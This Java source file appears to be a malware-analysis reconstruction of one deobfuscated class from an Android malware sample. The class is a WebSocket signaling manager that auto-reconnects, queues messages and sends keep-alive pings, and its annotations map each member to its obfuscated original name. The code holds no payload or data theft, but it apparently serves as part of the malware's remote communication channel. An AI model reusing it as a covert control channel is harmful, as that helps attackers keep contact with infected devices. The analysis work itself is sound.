package signaling;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import java.net.URI;
import java.util.Collections;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;

import org.json.JSONObject;

/**
 * MALWARE ANALYSIS -- WebSocket-based signaling connection manager
 *
 * Original: IlIlIIlIII1.IllIIlIIII1
 *
 * Manages a WebSocket connection to the signaling server with:
 *   - Automatic reconnection with exponential backoff (up to {@link #MAX_RETRIES} attempts)
 *   - Outbound message queuing when disconnected
 *   - Periodic ping/keep-alive on a 30-second interval
 *   - Main-thread dispatch for all callbacks via {@link Handler}
 *
 * The manager wraps a {@link SignalingWebSocket} (inner class extending
 * {@code WebSocketClientBase}) and bridges its raw WebSocket events to the
 * {@link SignalingConnectionListener} callback interface. All listener
 * callbacks are posted to the main looper so callers can safely touch UI.
 *
 * Lifecycle:
 *   1. Construct with target URI + listener
 *   2. {@link #connect()} opens the WebSocket
 *   3. On open: flush pending messages, start ping timer
 *   4. {@link #send(SignalingRequest)} serialises to JSON and sends (or queues)
 *   5. {@link #disconnect()} tears down cleanly
 *   6. On remote close / error: auto-reconnect if still enabled
 *
 * Threading model:
 *   - WebSocket read/write threads are managed by {@code WebSocketClientBase}
 *   - All listener dispatch happens on the Android main thread
 *   - Pending message queue is a lock-free {@link ConcurrentLinkedQueue}
 */
public class SignalingWebSocketManager {

    // =========================================================================
    // Constants
    // =========================================================================

    /**
     * Log tag (XOR-encrypted at runtime).
     * Original: f163IIlIllIIll1 (static, encrypted)
     */
    public static final String LOG_TAG = "SignalingWS";          /* decrypted from XOR */

    /**
     * Interval in milliseconds between WebSocket ping frames.
     * Original: f164IlIIlllllI1 = 30000
     */
    public static final long PING_INTERVAL = 30000;

    /**
     * Delay in milliseconds before a reconnection attempt.
     * Original: f165IlIllll1 = 3000
     */
    public static final long RECONNECT_DELAY = 3000;

    /**
     * Maximum number of consecutive reconnection attempts before giving up.
     * Original: f166lllllIllIl1 = 5
     */
    public static final int MAX_RETRIES = 5;

    // =========================================================================
    // Fields
    // =========================================================================

    /**
     * The underlying WebSocket client instance.
     * Original: f167IlIlIIlIII1 (type lllIlIIIlI1.lIIIIlllllIlll1 = WebSocketClientBase)
     */
    public WebSocketClientBase webSocketClient;                  /* mutable -- recreated on reconnect */

    /**
     * Callback listener for connection events.
     * Original: f171lIIIIlllllIlll1 (final)
     */
    public final SignalingConnectionListener listener;

    /**
     * Currently-scheduled ping {@link Runnable}, or null if ping is stopped.
     * Original: f172lIllIIIlIl1
     */
    public Runnable pingRunnable;

    /**
     * Target WebSocket URI (e.g. wss://signaling.example.com/ws).
     * Original: f173llllIIIIll1 (final)
     */
    public final URI uri;

    /**
     * Whether the WebSocket is currently in the OPEN state.
     * Original: f174llllIllIl1 (AtomicBoolean, default false)
     */
    public final AtomicBoolean isConnected = new AtomicBoolean(false);

    /**
     * Whether the manager is enabled for (re)connection.
     * Set to false on explicit disconnect or after max retries exceeded.
     * Original: f170IllIIlIIII1 (AtomicBoolean, default true)
     */
    public final AtomicBoolean isEnabled = new AtomicBoolean(true);

    /**
     * Number of consecutive reconnection attempts made so far.
     * Reset to 0 on successful connection.
     * Original: f169IlIlllIIlI1 (AtomicInteger, default 0)
     */
    public final AtomicInteger retryCount = new AtomicInteger(0);

    /**
     * Queue of messages that arrived while the socket was disconnected.
     * Flushed immediately once the connection is (re)established.
     * Original: f168IlIllIlllIllI1
     */
    public final ConcurrentLinkedQueue<SignalingRequest> pendingMessages = new ConcurrentLinkedQueue<>();

    /**
     * Handler tied to the Android main looper for dispatching callbacks.
     * Original: f175llllllIlIIIlll1
     */
    public final Handler mainHandler = new Handler(Looper.getMainLooper());

    // =========================================================================
    // Listener Interface
    // =========================================================================

    /**
     * Callback interface for signaling WebSocket events.
     *
     * Original: IlIlIIlIII1.IllIIlIIII1.IlIlllIIlI1
     *
     * All methods are invoked on the Android main thread.
     */
    public interface SignalingConnectionListener {

        /**
         * Called when the WebSocket connection is successfully established.
         * Original: llllIIIIll1()
         */
        void onConnected();

        /**
         * Called when the WebSocket connection is closed.
         * Original: llllIIIIll1(int, String, boolean)
         *
         * @param code   the WebSocket close code
         * @param reason human-readable close reason (never null)
         * @param remote true if the close was initiated by the remote end
         */
        void onClosed(int code, String reason, boolean remote);

        /**
         * Called when a signaling response message is received.
         * Original: llllIIIIll1(SignalingResponse)
         *
         * @param response the deserialized signaling response
         */
        void onMessage(SignalingResponse response);

        /**
         * Called when an error occurs on the WebSocket connection.
         * Original: llllIIIIll1(Exception)
         *
         * @param exception the exception describing the error
         */
        void onError(Exception exception);
    }

    // =========================================================================
    // Constructor
    // =========================================================================

    /**
     * Creates a new SignalingWebSocketManager.
     *
     * Original: IllIIlIIII1(URI, IlIlllIIlI1)
     *
     * @param uri      the WebSocket server URI
     * @param listener callback for connection events
     */
    public SignalingWebSocketManager(URI uri, SignalingConnectionListener listener) {
        this.uri = uri;
        this.listener = listener;
    }

    // =========================================================================
    // Connection Lifecycle
    // =========================================================================

    /**
     * Opens the WebSocket connection.
     * If already connected, logs a warning and returns immediately.
     * Resets the retry counter and marks the manager as enabled.
     *
     * Original: llllIIIIll1() [void, no args, connect]
     */
    public void connect() {
        if (this.isConnected.get()) {
            Log.w(LOG_TAG, "Already connected, ignoring connect()");
            return;
        }
        Log.i(LOG_TAG, "Connecting to " + this.uri);
        this.isEnabled.set(true);
        this.retryCount.set(0);
        createAndConnect();
    }

    /**
     * Disconnects the WebSocket and disables auto-reconnect.
     * Stops the ping timer, closes the socket if open, and clears the
     * pending message queue.
     *
     * Original: lIIIIlllllIlll1() [void]
     */
    public void disconnect() {
        Log.i(LOG_TAG, "Disconnecting");
        this.isEnabled.set(false);
        stopPing();
        WebSocketClientBase client = this.webSocketClient;
        if (client != null && client.isOpen()) {
            this.webSocketClient.close();
        }
        this.isConnected.set(false);
        this.pendingMessages.clear();
    }

    /**
     * Returns whether the WebSocket is currently in the OPEN state.
     *
     * Original: IlIlllIIlI1() -> boolean
     *
     * @return true if connected
     */
    public boolean isConnected() {
        return this.isConnected.get();
    }

    // =========================================================================
    // Sending Messages
    // =========================================================================

    /**
     * Sends a signaling request over the WebSocket.
     * If the connection is not open, the request is queued in
     * {@link #pendingMessages} for delivery once connected.
     *
     * Original: llllIIIIll1(SignalingRequest)
     *
     * @param request the signaling request to send
     */
    public void send(SignalingRequest request) {
        if (!this.isConnected.get()) {
            Log.w(LOG_TAG, "Not connected, queuing message for later");
            this.pendingMessages.offer(request);
            return;
        }
        try {
            String json = request.toJSONObject().toString();
            Log.v(LOG_TAG, "Sending signaling message: " + json);
            WebSocketClientBase client = this.webSocketClient;
            if (client != null) {
                client.send(json);
            }
        } catch (Exception e) {
            Log.e(LOG_TAG, "Failed to serialize/send signaling request", e);
            this.listener.onError(e);
        }
    }

    // =========================================================================
    // Internal: Connection Management
    // =========================================================================

    /**
     * Creates a new {@link SignalingWebSocket} and initiates the connection.
     *
     * Original: llllIllIl1() [void]
     */
    public final void createAndConnect() {
        try {
            SignalingWebSocket ws = new SignalingWebSocket(this.uri);
            this.webSocketClient = ws;
            ws.connect();
        } catch (Exception e) {
            Log.e(LOG_TAG, "Failed to create WebSocket client", e);
            this.mainHandler.post(new ErrorDispatchRunnable(e));
        }
    }

    /**
     * Flushes all queued messages that accumulated while disconnected.
     * Called immediately after a successful connection open.
     *
     * Original: IllIIlIIII1() [void]
     */
    public final void flushPendingMessages() {
        while (!this.pendingMessages.isEmpty() && this.isConnected.get()) {
            SignalingRequest pending = this.pendingMessages.poll();
            if (pending != null) {
                send(pending);
            }
        }
    }

    // =========================================================================
    // Internal: Reconnect Logic
    // =========================================================================

    /**
     * Schedules a reconnection attempt after {@link #RECONNECT_DELAY} ms.
     * Increments the retry counter; if it exceeds {@link #MAX_RETRIES},
     * disables the manager entirely.
     *
     * Original: IlIllIlllIllI1() [void]
     */
    public final void scheduleReconnect() {
        int attempt = this.retryCount.incrementAndGet();
        if (attempt > MAX_RETRIES) {
            Log.w(LOG_TAG, "Max retries (" + MAX_RETRIES + ") exceeded, giving up reconnection");
            this.isEnabled.set(false);
            return;
        }
        Log.i(LOG_TAG, "Scheduling reconnect attempt " + attempt + " in " + RECONNECT_DELAY + "ms");
        this.mainHandler.postDelayed(new ReconnectRunnable(), RECONNECT_DELAY);
    }

    // =========================================================================
    // Internal: Ping / Keep-alive
    // =========================================================================

    /**
     * Starts the periodic ping timer. Posts the first {@link PingRunnable}
     * after {@link #PING_INTERVAL} ms and re-schedules itself in a loop.
     *
     * Original: llllllIlIIIlll1() [void]
     */
    public final void startPing() {
        stopPing();
        PingRunnable ping = new PingRunnable();
        this.pingRunnable = ping;
        this.mainHandler.postDelayed(ping, PING_INTERVAL);
    }

    /**
     * Stops the periodic ping timer if one is running.
     *
     * Original: IlIlIIlIII1() [void]
     */
    public final void stopPing() {
        Runnable runnable = this.pingRunnable;
        if (runnable != null) {
            this.mainHandler.removeCallbacks(runnable);
            this.pingRunnable = null;
        }
    }

    // =========================================================================
    // Inner Runnables
    // =========================================================================

    /**
     * Runnable that sends a WebSocket ping frame and re-schedules itself.
     *
     * Original: RunnableC0002IllIIlIIII1 (PingRunnable)
     */
    public class PingRunnable implements Runnable {

        @Override
        public void run() {
            if (SignalingWebSocketManager.this.isConnected.get()) {
                try {
                    WebSocketClientBase client = SignalingWebSocketManager.this.webSocketClient;
                    if (client != null) {
                        client.sendPing();
                        Log.v(LOG_TAG, "Sent ping");
                    }
                } catch (Exception e) {
                    Log.w(LOG_TAG, "Ping failed", e);
                }
                SignalingWebSocketManager manager = SignalingWebSocketManager.this;
                manager.mainHandler.postDelayed(manager.pingRunnable, PING_INTERVAL);
            }
        }
    }

    /**
     * Runnable that dispatches an error to the listener on the main thread.
     *
     * Original: lIIIIlllllIlll1 (ErrorDispatchRunnable)
     */
    public class ErrorDispatchRunnable implements Runnable {

        /** The exception to report. Original: f178llllIIIIll1 */
        public final Exception exception;

        public ErrorDispatchRunnable(Exception exception) {
            this.exception = exception;
        }

        @Override
        public void run() {
            SignalingWebSocketManager.this.listener.onError(this.exception);
        }
    }

    /**
     * Runnable that attempts a reconnection if the manager is still
     * enabled and not yet connected.
     *
     * Original: llllIllIl1 (ReconnectRunnable)
     */
    public class ReconnectRunnable implements Runnable {

        @Override
        public void run() {
            if (!SignalingWebSocketManager.this.isEnabled.get()
                    || SignalingWebSocketManager.this.isConnected.get()) {
                return;
            }
            SignalingWebSocketManager.this.createAndConnect();
        }
    }

    // =========================================================================
    // Inner Class: SignalingWebSocket
    // =========================================================================

    /**
     * Concrete WebSocket client that bridges raw WebSocket events to the
     * enclosing {@link SignalingWebSocketManager}'s listener via main-thread
     * dispatch runnables.
     *
     * Original: IlIlIIlIII1.IllIIlIIII1$llllIIIIll1
     *     extends lllIlIIIlI1.lIIIIlllllIlll1 (WebSocketClientBase)
     */
    public class SignalingWebSocket extends WebSocketClientBase {

        /**
         * Constructs the WebSocket with an empty extensions list.
         *
         * Original: llllIIIIll1(URI, lIlllIIIII1.llllIIIIll1)
         */
        public SignalingWebSocket(URI serverUri) {
            super(serverUri);
        }

        // ----- WebSocketClientBase abstract method implementations -----

        /**
         * Called when a text message is received from the server.
         * Parses the JSON into a {@link SignalingResponse} and dispatches
         * via {@link MessageDispatchRunnable} on the main thread.
         *
         * Original: lIIIIlllllIlll1(String)
         */
        @Override
        public void onMessage(String message) {
            if (message == null || message.isEmpty()) {
                Log.w(LOG_TAG, "Received null/empty message");
                return;
            }
            Log.v(LOG_TAG, "Received message: " + message);
            try {
                SignalingResponse response = SignalingResponse.fromJSONObject(new JSONObject(message));
                SignalingWebSocketManager.this.mainHandler.post(new MessageDispatchRunnable(response));
            } catch (Exception e) {
                Log.e(LOG_TAG, "Failed to parse signaling response", e);
                SignalingWebSocketManager.this.mainHandler.post(new ErrorDispatchInnerRunnable(e));
            }
        }

        /**
         * Called when the WebSocket connection is successfully opened.
         * Sets the connected flag, resets retry count, flushes pending
         * messages, starts the ping timer, and notifies the listener.
         *
         * Original: llllIIIIll1(IlIlIIlIII1 = ServerHandshake)
         */
        @Override
        public void onOpen(Object serverHandshake) {
            Log.i(LOG_TAG, "WebSocket connection opened");
            SignalingWebSocketManager.this.isConnected.set(true);
            SignalingWebSocketManager.this.retryCount.set(0);
            SignalingWebSocketManager.this.flushPendingMessages();
            SignalingWebSocketManager.this.startPing();
            SignalingWebSocketManager.this.mainHandler.post(new ConnectedDispatchRunnable());
        }

        /**
         * Called when the WebSocket connection is closed.
         * Clears the connected flag, stops ping, dispatches the close
         * event, and schedules a reconnect if appropriate.
         *
         * Original: llllIIIIll1(int, String, boolean)
         */
        @Override
        public void onClose(int code, String reason, boolean remote) {
            Log.i(LOG_TAG, "WebSocket closed: code=" + code + ", reason=" + reason + ", remote=" + remote);
            SignalingWebSocketManager.this.isConnected.set(false);
            SignalingWebSocketManager.this.stopPing();
            SignalingWebSocketManager.this.mainHandler.post(new CloseDispatchRunnable(code, reason, remote));
            if (SignalingWebSocketManager.this.isEnabled.get() && remote) {
                SignalingWebSocketManager.this.scheduleReconnect();
            }
        }

        /**
         * Called when a WebSocket error occurs.
         * Clears the connected flag, stops ping, dispatches the error,
         * and schedules a reconnect if appropriate.
         *
         * Original: llllIIIIll1(Exception)
         */
        @Override
        public void onError(Exception exception) {
            Log.e(LOG_TAG, "WebSocket error", exception);
            SignalingWebSocketManager.this.isConnected.set(false);
            SignalingWebSocketManager.this.stopPing();
            if (exception == null) {
                exception = new Exception("Unknown WebSocket error");
            }
            SignalingWebSocketManager.this.mainHandler.post(new ErrorDispatchInnerRunnable(exception));
            if (SignalingWebSocketManager.this.isEnabled.get()) {
                SignalingWebSocketManager.this.scheduleReconnect();
            }
        }

        // ----- Inner dispatch runnables (post to main thread) -----

        /** Dispatches onError to listener. Original: IlIlllIIlI1 */
        public class ErrorDispatchInnerRunnable implements Runnable {
            public final Exception exception;

            public ErrorDispatchInnerRunnable(Exception exception) {
                this.exception = exception;
            }

            @Override
            public void run() {
                SignalingWebSocketManager.this.listener.onError(this.exception);
            }
        }

        /** Dispatches onClosed to listener. Original: RunnableC0003IllIIlIIII1 */
        public class CloseDispatchRunnable implements Runnable {
            public final int code;
            public final String reason;
            public final boolean remote;

            public CloseDispatchRunnable(int code, String reason, boolean remote) {
                this.code = code;
                this.reason = reason;
                this.remote = remote;
            }

            @Override
            public void run() {
                SignalingConnectionListener cb = SignalingWebSocketManager.this.listener;
                cb.onClosed(this.code, this.reason != null ? this.reason : "", this.remote);
            }
        }

        /** Dispatches onMessage to listener. Original: lIIIIlllllIlll1 */
        public class MessageDispatchRunnable implements Runnable {
            public final SignalingResponse response;

            public MessageDispatchRunnable(SignalingResponse response) {
                this.response = response;
            }

            @Override
            public void run() {
                SignalingWebSocketManager.this.listener.onMessage(this.response);
            }
        }

        /** Dispatches onConnected to listener. Original: RunnableC0004llllIIIIll1 */
        public class ConnectedDispatchRunnable implements Runnable {
            @Override
            public void run() {
                SignalingWebSocketManager.this.listener.onConnected();
            }
        }
    }
}
